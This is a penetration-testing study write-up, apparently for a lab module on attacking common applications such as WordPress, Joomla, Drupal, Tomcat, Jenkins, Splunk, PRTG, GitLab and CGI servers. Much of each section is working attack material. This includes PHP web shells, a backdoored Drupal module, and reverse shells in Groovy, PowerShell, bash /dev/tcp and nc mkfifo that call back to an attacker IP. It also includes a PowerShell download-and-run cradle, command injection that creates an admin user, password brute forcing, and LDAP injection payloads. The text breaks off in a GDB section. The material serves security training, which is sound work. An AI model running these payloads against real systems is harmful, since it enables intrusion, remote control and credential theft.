# Attacking Common Applications

| Field | Details |
|-------|---------|
| Module | 24 — Attacking Common Applications |
| Difficulty | Medium |
| Sections | 30 |
| Attacker | `10.10.16.36` |
| Lab Hosts | Multiple — see per-section targets |
| Date | September 2026 |

---

## Table of Contents

1. [Overview](#overview)
2. [Application Discovery and Enumeration](#application-discovery-and-enumeration)
3. [WordPress — Discovery, Enumeration and Attack](#wordpress--discovery-enumeration-and-attack)
4. [Joomla — Discovery, Enumeration and Attack](#joomla--discovery-enumeration-and-attack)
5. [Drupal — Discovery, Enumeration and Attack](#drupal--discovery-enumeration-and-attack)
6. [Apache Tomcat — Discovery, Enumeration and Attack](#apache-tomcat--discovery-enumeration-and-attack)
7. [Jenkins — Discovery, Enumeration and Attack](#jenkins--discovery-enumeration-and-attack)
8. [Splunk — Discovery, Enumeration and Attack](#splunk--discovery-enumeration-and-attack)
9. [PRTG Network Monitor — Discovery and Attack](#prtg-network-monitor--discovery-and-attack)
10. [osTicket — Enumeration and Abuse](#osticket--enumeration-and-abuse)
11. [GitLab — Discovery, Enumeration and Attack](#gitlab--discovery-enumeration-and-attack)
12. [Tomcat CGI — CVE-2019-0232](#tomcat-cgi--cve-2019-0232)
13. [CGI Applications — Shellshock (CVE-2014-6271)](#cgi-applications--shellshock-cve-2014-6271)
14. [Thick Client Applications](#thick-client-applications)
15. [ColdFusion — Discovery, Enumeration and Attack](#coldfusion--discovery-enumeration-and-attack)
16. [IIS Tilde Enumeration](#iis-tilde-enumeration)
17. [LDAP Injection](#ldap-injection)
18. [Web Mass Assignment Vulnerabilities](#web-mass-assignment-vulnerabilities)
19. [Attacking Applications Connecting to Services](#attacking-applications-connecting-to-services)
20. [Other Notable Applications](#other-notable-applications)
21. [Application Hardening](#application-hardening)
22. [Key Tools Reference](#key-tools-reference)
23. [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Overview

Web applications make up an enormous attack surface during both internal and external penetration tests. Organisations rely on a wide variety of third-party applications — CMS platforms, CI/CD pipelines, monitoring tools, ticketing systems, Git repositories — and each carries its own attack surface through known CVEs, misconfigured defaults, and built-in functionality that can be abused for Remote Code Execution.

According to Barracuda's 2021 research survey of 750 decision-makers in companies with 500+ employees:
- **72%** suffered at least one breach due to an application vulnerability
- **32%** suffered two breaches
- **14%** suffered three

This module teaches a repeatable methodology: discover applications via Nmap + EyeWitness/Aquatone, fingerprint the version, hunt for known CVEs, attempt default/weak credentials, and leverage built-in functionality for RCE.

### Common Application Categories

| Category | Applications |
|----------|--------------|
| Web Content Management | WordPress, Joomla, Drupal, DotNetNuke |
| Application Servers | Apache Tomcat, WebLogic, IBM WebSphere |
| SIEM | Splunk, Trustwave, LogRhythm |
| Network Management | PRTG, ManageEngine OpManager, Nagios |
| CI/CD | Jenkins, Gitlab, Bamboo |
| Customer Service | osTicket, Zendesk |
| Code Repositories | GitLab, GitHub Enterprise, Bitbucket |
| Search Engines | Elasticsearch, Apache Solr |
| EAI | Oracle Fusion, Apache ActiveMQ |

### /etc/hosts Setup for Module Labs

```bash
Hackerpatel007_1@htb[/htb]$ IP=10.129.42.195
Hackerpatel007_1@htb[/htb]$ printf "%s\t%s\n\n" "$IP" "app.inlanefreight.local dev.inlanefreight.local blog.inlanefreight.local" | sudo tee -a /etc/hosts
```

---

## Application Discovery and Enumeration

### Initial Nmap Web Discovery Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list
```

Common web-related ports to always scan:

| Port | Service |
|------|---------|
| 80 | HTTP |
| 443 | HTTPS |
| 8000 | Alternate HTTP / Splunk |
| 8080 | HTTP Proxy / Tomcat / Jenkins |
| 8180 | Tomcat (alternate) |
| 8500 | ColdFusion SSL |
| 8888 | Jupiter / alternate HTTP |
| 10000 | Webmin |

### EyeWitness — Screenshot-Based Web Discovery

```bash
Hackerpatel007_1@htb[/htb]$ eyewitness --xml web_discovery.xml -d screenshots
```

EyeWitness ingests Nmap XML output, takes screenshots of every discovered web service, and generates an HTML report. It categorises hosts as "High Value Targets," "Low Value Targets," and "Unknown." Tomcat Manager, Jenkins, Splunk, and PRTG are typically flagged as High Value.

### Aquatone — Alternative Screenshot Tool

```bash
Hackerpatel007_1@htb[/htb]$ cat web_discovery.xml | aquatone -nmap -out aquatone_report
```

Aquatone accepts Nmap XML, Masscan XML, and URL lists — useful for large external assessments where hundreds of web services are discovered.

### Notetaking Structure for Engagements

```
External Penetration Test - <Client Name>
├── Scope
├── Client Points of Contact
├── Credentials
├── Discovery/Enumeration
│   ├── Scans
│   └── Live Hosts
├── Application Discovery
│   ├── Scans
│   └── Interesting/Notable Hosts
├── Exploitation
│   └── <Hostname or IP>
└── Post-Exploitation
    └── <Hostname or IP>
```

---

## WordPress — Discovery, Enumeration and Attack

WordPress powers approximately **32.5% of all websites** on the internet and is the most popular CMS by market share. It is written in PHP and typically runs on Apache with MySQL. The module ecosystem (50,000+ plugins) is the primary attack surface.

### Discovery and Footprinting

```bash
# Check robots.txt — wp-admin and wp-content are WordPress giveaways
Hackerpatel007_1@htb[/htb]$ curl -s http://blog.inlanefreight.local/robots.txt

# Confirm WordPress and extract version
Hackerpatel007_1@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep WordPress

<meta name="generator" content="WordPress 5.8" />

# Identify active theme
Hackerpatel007_1@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep themes

# Identify installed plugins
Hackerpatel007_1@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep plugins
```

**Default WordPress Paths:**

| Path | Contents |
|------|----------|
| `/wp-login.php` | Admin login portal |
| `/wp-admin/` | Admin dashboard |
| `/wp-content/plugins/` | Installed plugins |
| `/wp-content/themes/` | Installed themes |
| `/xmlrpc.php` | XML-RPC API (used for brute force) |
| `/wp-content/uploads/` | Uploaded files |

**WordPress User Roles:**

| Role | Capabilities |
|------|--------------|
| Administrator | Full access — add/delete users, edit source code |
| Editor | Publish and manage all posts |
| Author | Publish and manage own posts |
| Contributor | Write but cannot publish |
| Subscriber | Read only |

### Automated Enumeration with WPScan

```bash
# Full enumeration with API token
Hackerpatel007_1@htb[/htb]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <TOKEN>

# Enumerate users only
Hackerpatel007_1@htb[/htb]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate u

# Password brute force against discovered user
Hackerpatel007_1@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john \
  -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

[+] Valid Combinations Found:
 | Username: john, Password: firebird1
```

> **Why xmlrpc over wp-login:** The XML-RPC API allows up to 50 login attempts per request versus one for wp-login — significantly faster for brute forcing.

### Attacking WordPress — Theme Editor RCE

```bash
# After gaining admin access -> Appearance -> Theme Editor -> Select inactive theme
# Edit 404.php in Twenty Nineteen -> Add PHP one-liner:
```

```php
system($_GET[0]);
```

```bash
# Execute commands via the modified theme page
Hackerpatel007_1@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Attacking WordPress — Metasploit Plugin Upload

```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.36
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run
```

---

## Joomla — Discovery, Enumeration and Attack

Joomla powers approximately **2.5 million websites** worldwide (3.5% CMS market share). Written in PHP with MySQL/PostgreSQL backend. 7,000+ extensions and 1,000+ templates.

### Discovery and Footprinting

```bash
# Confirm Joomla via meta generator tag
Hackerpatel007_1@htb[/htb]$ curl -s http://dev.inlanefreight.local/ | grep Joomla

<meta name="generator" content="Joomla! - Open Source Content Management" />

# Version fingerprinting via manifest file
Hackerpatel007_1@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

# Version from README
Hackerpatel007_1@htb[/htb]$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

**Joomla Fingerprinting Indicators:**
- `/robots.txt` — contains `/administrator/`, `/modules/`, `/plugins/`
- `/administrator/` — admin login panel
- `/README.txt` — version disclosure
- `/administrator/manifests/files/joomla.xml` — exact version in XML

### Automated Enumeration

```bash
# Droopescan for Joomla
Hackerpatel007_1@htb[/htb]$ droopescan scan joomla -u http://dev.inlanefreight.local

# JoomScan
Hackerpatel007_1@htb[/htb]$ sudo perl joomscan.pl -u http://dev.inlanefreight.local
```

### Attacking Joomla — Template Editor RCE

```bash
# Login -> Extensions -> Templates -> Select template (e.g., Protostar)
# Edit error.php -> inject PHP one-liner using hashed parameter name:
```

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

```bash
# Execute via template file
Hackerpatel007_1@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Security practice:** Always use a hashed parameter name (MD5 of a random string) rather than `cmd` or `c` to prevent opportunistic "drive-by" attackers stumbling on your web shell during the assessment.

### Attacking Joomla — Known CVEs

```bash
# CVE-2019-10945 — Directory traversal + authenticated file deletion (Joomla 3.9.4)
Hackerpatel007_1@htb[/htb]$ python2.7 joomla_dir_trav.py \
  --url "http://dev.inlanefreight.local/administrator/" \
  --username admin --password admin --dir /
```

---

## Drupal — Discovery, Enumeration and Attack

Drupal holds approximately **1.1 million installations** (2.4% CMS market share). Written in PHP, supports MySQL/PostgreSQL/SQLite. Used by 56% of government websites worldwide and 33 Fortune 500 companies.

### Discovery and Footprinting

```bash
# Confirm Drupal via meta generator
Hackerpatel007_1@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal

<meta name="Generator" content="Drupal 8 (https://www.drupal.org)" />

# Version via CHANGELOG.txt (blocked in newer installs)
Hackerpatel007_1@htb[/htb]$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21

# Automated enumeration
Hackerpatel007_1@htb[/htb]$ droopescan scan drupal -u http://drupal.inlanefreight.local
```

**Drupal fingerprinting indicators:**
- `Powered by Drupal` in footer
- `/node/<number>` URL structure
- `/CHANGELOG.txt` and `/README.txt`
- `/core/CHANGELOG.txt` (Drupal 8+)

### Attacking Drupal — PHP Filter Module (Drupal 7)

```bash
# Admin -> Modules -> Enable "PHP Filter"
# Admin -> Content -> Add Content -> Basic Page
# Set Text Format to "PHP code" and embed web shell:
```

```php
<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>
```

```bash
# Execute via the created node
Hackerpatel007_1@htb[/htb]$ curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id" | grep uid

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Attacking Drupal — Backdoored Module Upload (Drupal 8+)

```bash
# Download legitimate module
Hackerpatel007_1@htb[/htb]$ wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
Hackerpatel007_1@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz

# Create PHP web shell
Hackerpatel007_1@htb[/htb]$ echo '<?php system($_GET["fe8edbabc5c5c9b7b764504cd22b17af"]); ?>' > shell.php

# Create .htaccess to allow module directory access
Hackerpatel007_1@htb[/htb]$ cat .htaccess
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>

# Add both to module archive and re-package
Hackerpatel007_1@htb[/htb]$ mv shell.php .htaccess captcha
Hackerpatel007_1@htb[/htb]$ tar cvf captcha.tar.gz captcha/

# Upload via Admin -> Reports -> Available Updates -> Install New Module
# Access shell via: /modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
```

---

## Apache Tomcat — Discovery, Enumeration and Attack

Tomcat hosts applications written in Java (Servlets and JSPs). Over **220,000 live Tomcat websites** with 904,000+ having used it historically. Holds 13th position for web server market share.

### Tomcat Directory Structure

```
├── bin/              ← Startup scripts and binaries
├── conf/
│   ├── tomcat-users.xml    ← User credentials and roles
│   └── web.xml             ← Deployment descriptor
├── webapps/
│   ├── manager/            ← Manager application (HIGH VALUE)
│   └── ROOT/               ← Default application
└── logs/
```

### Discovery and Footprinting

```bash
# Version via error page
Hackerpatel007_1@htb[/htb]$ curl -s http://app-dev.inlanefreight.local:8080/invalid

# Version via /docs
Hackerpatel007_1@htb[/htb]$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat

# Default tomcat-users.xml path (try via LFI if one exists)
/usr/share/tomcat9/etc/tomcat-users.xml
/opt/tomcat/conf/tomcat-users.xml
```

### Brute Force Tomcat Manager Credentials

```bash
# Metasploit module
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
```

**Common Tomcat default credentials:**

| Username | Password |
|----------|----------|
| `tomcat` | `tomcat` |
| `admin` | `admin` |
| `tomcat` | `s3cret` |
| `admin` | `tomcat` |
| `manager` | `manager` |

### Attacking Tomcat — WAR File Upload RCE

```bash
# Generate malicious WAR file
Hackerpatel007_1@htb[/htb]$ msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=10.10.16.36 LPORT=4444 -f war > shell.war

# Deploy via Manager UI -> WAR file to deploy -> Browse -> Select shell.war -> Deploy
# OR via Metasploit:
msf6 > use exploit/multi/http/tomcat_mgr_upload
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.129.201.58
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword admin
msf6 exploit(multi/http/tomcat_mgr_upload) > set VHOST web01.inlanefreight.local
msf6 exploit(multi/http/tomcat_mgr_upload) > run

# Access the deployed WAR shell
Hackerpatel007_1@htb[/htb]$ curl http://web01.inlanefreight.local:8180/shell/
```

---

## Jenkins — Discovery, Enumeration and Attack

Jenkins is a Java-based CI/CD automation server. Over **86,000 companies** use it. Often runs as root on Linux or SYSTEM on Windows — making it an extremely high-value target. Runs on Tomcat on port 8080 by default.

### Discovery

Jenkins is identifiable by its login page at `/login` and often listed as a "High Value Target" in EyeWitness reports. Default port 8080.

### Attacking Jenkins — Groovy Script Console RCE

```bash
# Access: http://jenkins.inlanefreight.local:8000/script
# Requires admin credentials — check for admin:admin, no auth, or weak passwords
```

**Linux Groovy RCE:**

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

**Linux Reverse Shell via Groovy:**

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.16.36/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.16.36] from (UNKNOWN) [10.129.201.58] 57844
uid=0(root) gid=0(root) groups=0(root)
```

**Windows Groovy RCE:**

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

**Windows Groovy Reverse Shell:**

```groovy
String host="10.10.16.36";
int port=8443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

---

## Splunk — Discovery, Enumeration and Attack

Splunk is a log analytics/SIEM tool used by **92 of the Fortune 100** companies. It runs on port 8000 (web) and 8089 (REST API/management). Default credentials: `admin:changeme` (older versions). After 60 days, the trial converts to a free version requiring no authentication.

### Discovery

```bash
Hackerpatel007_1@htb[/htb]$ sudo nmap -sV 10.129.201.50 -p 8000,8089

PORT     STATE SERVICE  VERSION
8000/tcp open  ssl/http Splunkd httpd
8089/tcp open  ssl/http Splunkd httpd
```

### Attacking Splunk — Scripted Input Custom App RCE

```bash
# Step 1 — Create directory structure
Hackerpatel007_1@htb[/htb]$ mkdir -p splunk_shell/{bin,default}

# Step 2 — Create PowerShell reverse shell (run.ps1)
Hackerpatel007_1@htb[/htb]$ cat splunk_shell/bin/run.ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.36',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Step 3 — Create batch wrapper (run.bat)
Hackerpatel007_1@htb[/htb]$ cat splunk_shell/bin/run.bat
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit

# Step 4 — Create inputs.conf (tells Splunk to run the script every 10 seconds)
Hackerpatel007_1@htb[/htb]$ cat splunk_shell/default/inputs.conf
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10

# Step 5 — Package as tarball
Hackerpatel007_1@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/

# Step 6 — Start listener
Hackerpatel007_1@htb[/htb]$ sudo nc -lnvp 443

# Step 7 — Upload via Splunk UI: Apps -> Manage Apps -> Install app from file -> updater.tar.gz
```

---

## PRTG Network Monitor — Discovery and Attack

PRTG is an agentless network monitoring solution used by **300,000 users** worldwide. Runs on port 8080 by default. Vulnerable to CVE-2018-9276 — authenticated OS command injection in PRTG < 18.2.39.

### Discovery

```bash
Hackerpatel007_1@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0" | grep version

PRTG Network Monitor 17.3.33.2830
```

Default credentials: `prtgadmin:prtgadmin`

### Attacking PRTG — CVE-2018-9276 Command Injection

```bash
# Setup -> Account Settings -> Notifications -> Add new notification
# Select "Execute Program" under "Execute Program"
# Parameter field is vulnerable -- inject: test.txt;net user prtgadm1n P@ssw0rd /add
# The parameter is passed directly to PowerShell without sanitisation
# Add to local admin group: test.txt;net localgroup administrators prtgadm1n /add

# Confirm new admin user
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 10.129.201.50 -u prtgadm1n -p P@ssw0rd

SMB  10.129.201.50  445  WIN-...  [+] WIN-...\prtgadm1n:P@ssw0rd (Pwn3d!)
```

---

## osTicket — Enumeration and Abuse

osTicket is a widely-used open-source support ticketing system. Notable not for direct exploitation but for **abusing the ticket workflow** to obtain company email addresses and access other exposed services.

### Obtaining a Company Email via Ticket Submission

```bash
# Submit a ticket at /open.php
# The system assigns an auto-generated email: 940288@inlanefreight.local
# Use this email to register on internal services (Mattermost, Slack, GitLab, Jira)
# The account confirmation email arrives in the ticket thread
```

**Abuse chain:**
1. Find osTicket instance during assessment
2. Submit a ticket — receive a `<ticketID>@company.local` internal email
3. Use that email to register on GitLab/Slack/Mattermost requiring a company domain
4. Confirmation email routes to the ticket — verify and log in to the new service
5. Enumerate repositories, channels, wikis for credentials, config files, and sensitive data

### Attacking osTicket — Credential Stuffing

```bash
# Use Dehashed to find leaked credentials for the target domain
Hackerpatel007_1@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p

# Test discovered credentials against osTicket admin panel
Hackerpatel007_1@htb[/htb]$ curl -s http://support.inlanefreight.local/scp/login.php \
  --data "username=jclayton&passwd=JulieC8765!&submit=1"
```

---

## GitLab — Discovery, Enumeration and Attack

GitLab has **30+ million registered users**. Sensitive repositories can yield SSH keys, credentials, API tokens, and infrastructure details even without authentication.

### Unauthenticated Enumeration

```bash
# Check /explore for public projects
http://gitlab.inlanefreight.local:8081/explore

# Enumerate valid users via registration form (username already taken = valid)
http://gitlab.inlanefreight.local:8081/users/sign_up

# Username enumeration script
Hackerpatel007_1@htb[/htb]$ ./gitlab_userenum.sh \
  --url http://gitlab.inlanefreight.local:8081/ \
  --userlist users.txt

[+] The username root exists!
[+] The username bob exists!
```

### Authenticated RCE — CVE-2021-22205 (GitLab CE 13.10.2)

```bash
# Exploits ExifTool handling of uploaded image metadata
Hackerpatel007_1@htb[/htb]$ python3 gitlab_13_10_2_rce.py \
  -t http://gitlab.inlanefreight.local:8081 \
  -u mrb3n -p password1 \
  -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.36 8443 >/tmp/f'

[1] Authenticating -> Successfully Authenticated
[2] Creating Payload
[3] Creating Snippet and Uploading
[+] RCE Triggered !!

Hackerpatel007_1@htb[/htb]$ nc -lnvp 8443
connect to [10.10.16.36] from (UNKNOWN) [10.129.201.88] 60054
git@app04:~/gitlab-workhorse$
```

---

## Tomcat CGI — CVE-2019-0232

**CVE-2019-0232** is a critical RCE affecting Apache Tomcat on Windows when `enableCmdLineArguments=true` is set for the CGI Servlet. Affected versions: 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93.

### Discovery

```bash
# Nmap scan to confirm Tomcat version
Hackerpatel007_1@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open

PORT     STATE SERVICE
8080/tcp open  http-proxy  Apache Tomcat/9.0.17

# Fuzz for CGI scripts
Hackerpatel007_1@htb[/htb]$ ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ \
  -u http://10.129.204.227:8080/cgi/FUZZ.cmd

Hackerpatel007_1@htb[/htb]$ ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ \
  -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

### Exploitation

```bash
# Inject OS commands via URL query string -- & separator runs additional commands
http://10.129.204.227:8080/cgi/welcome.bat?&dir

# Reverse shell via PowerShell payload
http://10.129.204.227:8080/cgi/welcome.bat?&powershell+-nop+-c+iex(New-Object+Net.WebClient).DownloadString('http://10.10.16.36/rev.ps1')
```

---

## CGI Applications — Shellshock (CVE-2014-6271)

Shellshock exploits a vulnerability in Bash (GNU Bash < 4.3) that allows command execution via environment variables. It remains findable in embedded devices and legacy servers.

### Discovery

```bash
# Find CGI scripts with Gobuster
Hackerpatel007_1@htb[/htb]$ gobuster dir \
  -u http://10.129.204.231/cgi-bin/ \
  -w /usr/share/wordlists/dirb/small.txt -x cgi

/access.cgi   (Status: 200) [Size: 0]
```

### Exploitation

```bash
# Test for vulnerability via User-Agent header
Hackerpatel007_1@htb[/htb]$ curl -s -A "() { :;}; echo Content-Type: text/plain; echo; /usr/bin/id" \
  http://10.129.204.231/cgi-bin/access.cgi

uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Reverse shell via Shellshock
Hackerpatel007_1@htb[/htb]$ curl -s -A "() { :;}; /bin/bash -i >& /dev/tcp/10.10.16.36/9001 0>&1" \
  http://10.129.204.231/cgi-bin/access.cgi

# Nmap NSE script detection
Hackerpatel007_1@htb[/htb]$ nmap -sV -p 80 --script http-shellshock \
  --script-args uri=/cgi-bin/access.cgi 10.129.204.231
```

---

## Thick Client Applications

Thick client applications process data locally rather than in a browser. Two-tier (client ↔ database directly) and three-tier (client → app server → database) architectures present distinct attack surfaces.

### Testing Methodology

| Phase | Tools |
|-------|-------|
| Information Gathering | CFF Explorer, Detect It Easy, ProcMon, Strings |
| Static Analysis / Reverse Engineering | Ghidra, dnSpy, JADX, IDA, Radare2 |
| Dynamic Analysis / Debugging | x64dbg, OllyDbg, Frida |
| Network Analysis | Wireshark, Burp Suite, TCPView, tcpdump |

### Hardcoded Credentials — ProcMon Technique

```bash
# Monitor process with ProcMon to find temp files created by the application
# Deny delete permissions on the temp directory to capture the file before cleanup
# Read the captured batch/script file -- often contains hardcoded credentials or SQL connection strings

# Strings on Windows binary
Hackerpatel007_1@htb[/htb]$ strings RestartOracle-Service.exe | grep -i "pass\|user\|server\|connect"
```

### Three-Tier Thick Client — JAR Modification

```bash
# Extract JAR file
Hackerpatel007_1@htb[/htb]$ jar xvf fatty-client.jar

# Search for hardcoded configuration (e.g., port numbers)
Hackerpatel007_1@htb[/htb]$ ls fatty-client/ -recurse | Select-String "8000" | Select Path, LineNumber

# Edit beans.xml to update port
# Recompile -- note: JAR is signed, SHA-256 hashes in MANIFEST.MF must be updated
```

---

## ColdFusion — Discovery, Enumeration and Attack

Adobe ColdFusion is a Java-based web application platform using CFML. Default port 8500. Known vulnerabilities include unauthenticated directory traversal (CVE-2010-2861) and RCE (CVE-2023-26360).

### Discovery

```bash
Hackerpatel007_1@htb[/htb]$ nmap -p- -sC -Pn 10.129.247.30 --open

PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

# Default admin path
http://10.129.247.30:8500/CFIDE/administrator/
```

**ColdFusion fingerprinting indicators:**
- `.cfm` and `.cfc` file extensions
- `X-Powered-By: ColdFusion` header
- `/CFIDE/administrator/index.cfm` admin panel
- Port 8500 open

### Attacking ColdFusion — Directory Traversal (CVE-2010-2861)

```bash
# Searchsploit
Hackerpatel007_1@htb[/htb]$ searchsploit adobe coldfusion

# Copy and run the directory traversal script
Hackerpatel007_1@htb[/htb]$ searchsploit -p 14641
Hackerpatel007_1@htb[/htb]$ python2 14641.py <TARGET> <PORT> <PATH>

# Example -- read password hash
Hackerpatel007_1@htb[/htb]$ python2 14641.py 10.129.247.30 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

### Attacking ColdFusion — RCE (CVE-2023-26360)

```bash
# Pre-auth RCE in ColdFusion 2018 Update 15 and 2021 Update 5 and earlier
Hackerpatel007_1@htb[/htb]$ python3 cf_rce.py -u http://10.129.247.30:8500 -c "whoami"
```

---

## IIS Tilde Enumeration

IIS tilde enumeration discovers hidden files and directories using Windows 8.3 short file names (e.g., `SECRET~1`). Exploits a vulnerability in how IIS handles requests for short file names.

### How It Works

```
http://TARGET/~s       -> 200 OK -> directory starting with 's' exists
http://TARGET/~se      -> 200 OK -> narrows to 'se'
http://TARGET/~sec     -> 200 OK -> narrows to 'sec'
...
http://TARGET/~secret  -> 200 OK -> short name is secret~1
http://TARGET/secret~1/somefile.txt -> access the file
```

### Automated Enumeration

```bash
# Install and run IIS-ShortName-Scanner
Hackerpatel007_1@htb[/htb]$ java -jar iis_shortname_scanner.jar 2 20 http://TARGET/

Hackerpatel007_1@htb[/htb]$ nmap -p 80 --script http-iis-short-name-brute TARGET
```

---

## LDAP Injection

LDAP (Lightweight Directory Access Protocol) injection occurs when user input is inserted directly into LDAP queries without sanitisation.

### LDAP Injection — Authentication Bypass

```bash
# Standard LDAP login query:
# (&(uid=user)(password=pass))

# Inject wildcard to bypass:
# Username: *
# Password: *
# Results in: (&(uid=*)(password=*)) -> matches all users

# Or inject closing parenthesis to truncate:
# Username: admin)(&)
# Results in: (&(uid=admin)(&)) -> always true

# Enumerate valid usernames
Hackerpatel007_1@htb[/htb]$ ldapsearch -H ldap://ldap.example.com:389 \
  -D "cn=admin,dc=example,dc=com" -w secret123 \
  -b "ou=people,dc=example,dc=com" \
  "(mail=john.doe@example.com)"
```

### LDAP Injection — Blind Enumeration

```bash
# Test attribute existence with boolean responses
# Payload: *)(uid=*))(|(uid=*  -> always true if injection is present

# Enumerate user attributes character by character
# Username: admin)(|(password=a*
# Username: admin)(|(password=b*
# ... until no match, then try next character
```

---

## Web Mass Assignment Vulnerabilities

Mass assignment vulnerabilities occur when a framework directly maps HTTP request parameters to model attributes without a whitelist — allowing attackers to set unintended fields (e.g., `admin=true`, `confirmed=true`, `role=admin`).

### Detection and Exploitation

```bash
# Identify the registration request with Burp Suite
POST /register HTTP/1.1

username=newuser&password=test123

# Add an extra parameter that may control approval status
POST /register HTTP/1.1

username=newuser&password=test123&confirmed=true

# Or target role escalation
POST /register HTTP/1.1

username=newuser&password=test123&role=admin&isAdmin=true
```

**Common mass assignment targets:**

| Parameter | Effect |
|-----------|--------|
| `confirmed=true` | Bypass email/admin verification |
| `admin=true` | Elevate to admin role |
| `role=admin` | Set administrative role |
| `is_approved=true` | Auto-approve account |
| `credit=99999` | Modify balance/credits |

---

## Attacking Applications Connecting to Services

Applications connecting to databases or services may leak credentials in their binary if not properly protected.

### Extracting Hardcoded ODBC Credentials — GDB

```bash
# Load binary in GDB with PEDA extension
Hackerpatel007_1@htb[/htb]$ gdb ./octopus_checker

gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main

# Set breakpoint just before the connection string is assembled
gdb-peda$ break *0x0000555555555625
gdb-peda$ run

